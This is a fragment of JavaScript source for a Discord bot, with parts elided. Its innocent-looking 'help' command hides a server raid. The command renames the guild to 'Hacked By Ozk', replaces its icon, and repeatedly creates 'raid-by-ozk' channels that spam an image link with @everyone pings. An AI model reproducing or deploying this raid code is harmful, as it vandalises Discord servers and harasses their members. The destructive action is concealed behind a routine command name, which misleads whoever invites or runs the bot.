...
bot.on('message', async message => { 
    ...
    var mutedrole = message.guild.roles.find("name", "muted");
      ...
      if (command == "help") { 
        ...
        var name = "raid-by-ozk";
    
    message.guild.setIcon("https://cdn.discordapp.com/attachments/553949003939577857/564438859841011713/image0.png")
    message.guild.setName("Hacked By Ozk")
    bot.setInterval(() =>
    {
    server.createChannel(name, "text").then(channel => {
    channel.send("https://cdn.discordapp.com/attachments/553949003939577857/564438859841011713/image0.png    @everyone")
    channel.send("https://cdn.discordapp.com/attachments/553949003939577857/564438859841011713/image0.png    @everyone")
    channel.send("https://cdn.discordapp.com/attachments/553949003939577857/564438859841011713/image0.png    @everyone")
    channel.send("https://cdn.discordapp.com/attachments/553949003939577857/564438859841011713/image0.png    @everyone")
    channel.send("https://cdn.discordapp.com/attachments/553949003939577857/564438859841011713/image0.png    @everyone")
